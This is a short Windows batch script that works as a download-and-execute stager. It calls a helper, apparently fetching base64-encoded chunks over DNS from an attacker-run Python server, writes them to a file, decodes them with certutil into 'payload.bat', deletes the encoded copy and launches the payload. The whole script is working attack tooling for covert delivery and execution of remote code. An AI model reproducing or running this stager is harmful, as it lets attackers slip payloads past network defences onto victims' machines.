@echo off
REM Written by Daniel Vinakovsky
REM dvinak@gmail.com
REM http://www.gnurds.com

setlocal EnableDelayedExpansion
set encodedoutfile=outputb64
set rawoutfile=payload.bat

REM set for loop range to how many pieces of the file there will be (the python server script should tell you)
FOR /L %%I IN (0,1,0) DO (
	ECHO %%I
	FOR /f "skip=12 usebackq tokens=1" %%a IN (`dnsftp_downloader.bat %%I`) DO (
		set tempvar=%%a
		REM strip quotation marks
		set output=!tempvar:"=!
		@echo !output! >> %encodedoutfile%
		)
)
REM base64 decode the downloaded payload, overwrite.
certutil -decode -f %encodedoutfile% %rawoutfile%
REM delete teh encoded payload
del %encodedoutfile%
REM launch the payload
start "" "payload.bat"